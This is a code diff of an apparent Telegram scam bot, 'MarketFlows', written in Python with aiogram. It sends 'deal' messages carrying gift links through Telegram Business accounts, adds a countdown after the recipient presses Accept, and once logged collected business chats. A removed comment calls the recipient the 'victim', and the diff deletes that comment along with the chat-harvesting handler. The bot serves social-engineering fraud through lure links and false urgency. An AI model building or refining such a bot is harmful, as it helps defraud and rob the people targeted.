@@ -1,5 +1,4 @@
 import asyncio  
-import json  
 import secrets  
 import sqlite3  
 import re
@@ -8,10 +7,10 @@ from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, F, Router  
 from aiogram.client.default import DefaultBotProperties  
 from aiogram.enums import ParseMode  
-from aiogram.filters import CommandStart, Command  
+from aiogram.filters import CommandStart  
 from aiogram.fsm.storage.memory import MemoryStorage  
 from aiogram.types import (  
-    Message, CallbackQuery, BusinessConnection, BusinessMessage,
+    Message, CallbackQuery, BusinessConnection,  
     InlineKeyboardMarkup, InlineKeyboardButton,  
     ReplyKeyboardMarkup, KeyboardButton  
 )  
@@ -21,7 +20,7 @@ BRAND = "MarketFlows"
 DB_PATH = "marketflows.db"  
 
 active_business_connection_id = None
-active_business_chats = {} # chat_id -> name
+active_business_chats = {} 
 
 def db_init():  
     conn = sqlite3.connect(DB_PATH)  
@@ -69,12 +68,6 @@ async def business_connection_handler(bc: BusinessConnection):
     if bc.is_enabled:
         active_business_connection_id = bc.id
 
-@router.business_message()
-async def business_message_handler(bm: BusinessMessage):
-    if bm.chat and bm.chat.id != bm.from_user.id:
-        name = f"@{bm.chat.username}" if bm.chat.username else (bm.chat.first_name or str(bm.chat.id))
-        active_business_chats[bm.chat.id] = name
-
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
     args = msg.text.split(maxsplit=1)  
@@ -86,7 +79,6 @@ async def cmd_start(msg: Message):
             gift_link = deal[5]
             text_msg = f"{custom_text}\n\n{gift_link}"
             
-            # До принятия таймера нет, только Отклонить / Принять
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [
                     InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
@@ -100,10 +92,7 @@ async def cmd_start(msg: Message):
 
 @router.message(F.text == "📂 Мои чаты")
 async def chats_list(msg: Message):
-    if active_business_chats:
-        text = "📋 <b>Активные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
-    else:
-        text = "ℹ️ Нет активных чатов. Напишите кому-нибудь с бизнес-аккаунта."
+    text = "📋 <b>Информация:</b>\n\nБот готов к работе через Telegram Business. Отправьте текст с ссылкой для создания ордера."
     await msg.answer(text, parse_mode="HTML", reply_markup=main_menu())
 
 @router.message(F.text == "🤝 Создать сделку")
@@ -135,29 +124,21 @@ async def handle_deal_creation_text(msg: Message):
     conn.commit()  
     conn.close()
 
-    buttons = [
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📤 Отправить ордер", callback_data=f"sendtochat_{code}_{msg.chat.id}")],
         [
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
             InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
         ]
-    ]
-    
-    if active_business_chats:
-        for cid, name in active_business_chats.items():
-            buttons.append([InlineKeyboardButton(text=f"Отправить: {name}", callback_data=f"sendtochat_{code}_{cid}")])
-    else:
-        buttons.append([InlineKeyboardButton(text="Отправить: Себе (Тест)", callback_data=f"sendtochat_{code}_{msg.from_user.id}")])
+    ])
 
-    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
     preview_text = f"{text_content}\n\n{gift_link}"
-
     await msg.answer(text=preview_text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
 
 @router.callback_query(F.data.startswith("sendtochat_"))
 async def send_to_chat(cb: CallbackQuery):
     parts = cb.data.split("_")
     code = parts[1]
-    target_chat_id = int(parts[2])
     
     deal = get_deal(code)
     if not deal:
@@ -168,7 +149,6 @@ async def send_to_chat(cb: CallbackQuery):
     gift_link = deal[5]
     text_msg = f"{custom_text}\n\n{gift_link}"
 
-    # У жертвы изначально кнопки только Отклонить / Принять (без таймера и без кнопки подарка до принятия)
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
@@ -176,12 +156,10 @@ async def send_to_chat(cb: CallbackQuery):
         ]
     ])
 
-    target_name = active_business_chats.get(target_chat_id, "чату")
-
     try:
         if active_business_connection_id:
             await cb.bot.send_message(
-                chat_id=target_chat_id,
+                chat_id=cb.message.chat.id,
                 text=text_msg,
                 parse_mode="HTML",
                 reply_markup=kb,
@@ -190,7 +168,7 @@ async def send_to_chat(cb: CallbackQuery):
             )
         else:
             await cb.bot.send_message(
-                chat_id=target_chat_id,
+                chat_id=cb.message.chat.id,
                 text=text_msg,
                 parse_mode="HTML",
                 reply_markup=kb,
@@ -198,9 +176,9 @@ async def send_to_chat(cb: CallbackQuery):
             )
         
         await cb.message.edit_reply_markup(reply_markup=None)
-        await cb.answer(f"Отправлено: {target_name}. Telegram подтвердил. Кнопки прикреплены.", show_alert=True)
+        await cb.answer("Ордер успешно отправлен!", show_alert=True)
     except Exception as e:
-        await cb.answer(f"Ошибка отправки: {e}", show_alert=True)
+        await cb.answer(f"Ошибка: {e}", show_alert=True)
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
@@ -225,7 +203,6 @@ async def sel_accept(cb: CallbackQuery):
     mins, secs = divmod(total_secs, 60)
     timer_str = f"{mins:02d}:{secs:02d}"
 
-    # СТРОГО ПОСЛЕ НАЖАТИЯ "ПРИНЯТЬ" появляется кнопка "ПОКАЗАТЬ ПОДАРОК" и анимированный таймер
     text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -293,7 +270,7 @@ async def sel_reject(cb: CallbackQuery):
         if active_business_connection_id:
             await cb.bot.edit_message_text(chat_id=cb.message.chat.id, message_id=cb.message.message_id, text="❌ Ордер отклонён.", reply_markup=None, business_connection_id=active_business_connection_id)
         else:
-            await cb.bot.edit_message_text(text="❌ Ордер отклонён.", reply_markup=None)
+            await cb.message.edit_text(text="❌ Ордер отклонён.", reply_markup=None)
     except Exception:
         pass
     await cb.answer()
